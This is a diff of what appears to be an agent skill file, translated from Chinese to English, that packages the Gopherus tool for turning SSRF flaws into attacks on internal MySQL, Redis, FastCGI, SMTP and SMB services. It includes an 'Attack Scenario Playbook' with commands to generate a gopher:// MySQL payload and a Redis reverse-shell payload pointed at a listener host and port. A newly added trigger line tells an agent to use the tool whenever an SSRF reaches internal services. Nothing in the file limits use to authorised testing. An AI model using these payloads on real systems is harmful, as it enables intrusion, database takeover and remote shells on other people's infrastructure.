@@ -2,40 +2,42 @@
 name: gopherus-ssrf
 description: "Gopherus uses SSRF to attack internal MySQL and Redis. Signals: web vulnerabilities, injection, Redis payloads, SSH payloads, SMTP sending."
 zh-signals: "Gopherus: SSRF 打内网 MySQL/Redis。信号:web漏洞,注入,Redis 载荷,SSH 载荷,SMTP 发信。"
+when-to-use: >-
+  Use when an SSRF vulnerability can reach internal services, generating gopher:// payloads to attack MySQL, Redis, FastCGI, SMTP or SMB.
 ---
 
 # Gopherus
 
-- 攻击大类:C09 Web应用漏洞利用
-- 上游仓库:https://github.com/tarunkant/Gopherus
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C09 Web Application Vulnerability Exploitation
+- Upstream Repository: https://github.com/tarunkant/Gopherus
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/tarunkant/Gopherus && cd Gopherus
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python gopherus.py --exploit mysql` | 生成 MySQL 攻击载荷 |
-| `--exploit redis` | Redis 载荷 |
-| `--exploit ssh` | SSH 载荷 |
-| `--exploit smtp` | SMTP 发信 |
+| `python gopherus.py --exploit mysql` | Generate a MySQL attack payload |
+| `--exploit redis` | Redis payload |
+| `--exploit ssh` | SSH payload |
+| `--exploit smtp` | SMTP sending |
 | `--exploit rce` | FastCGI RCE |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### SSRF 打内网 MySQL/Redis
+### SSRF Against Internal MySQL/Redis
 
 ```bash
-python gopherus.py --exploit mysql  # 填 root 密码与查询语句
-# 输出 gopher:// 编码载荷,塞进 SSRF 点 → 内网数据库执行
-python gopherus.py --exploit redis --lhost 10.8.0.2 --lport 4444  # 反弹载荷
+python gopherus.py --exploit mysql  # fill in the root password and the query
+# Outputs an encoded gopher:// payload; feed it into the SSRF point to reach the internal database
+python gopherus.py --exploit redis --lhost 10.8.0.2 --lport 4444  # reverse payload
 ```
 
-## 注意事项
+## Notes
 
-生成 gopher:// 协议载荷把 SSRF 升级为内网协议攻击;覆盖 MySQL/Redis/FastCGI/SMTP/SMB 等。
+Generates gopher:// protocol payloads that upgrade an SSRF into an internal protocol attack; covers MySQL/Redis/FastCGI/SMTP/SMB and more.
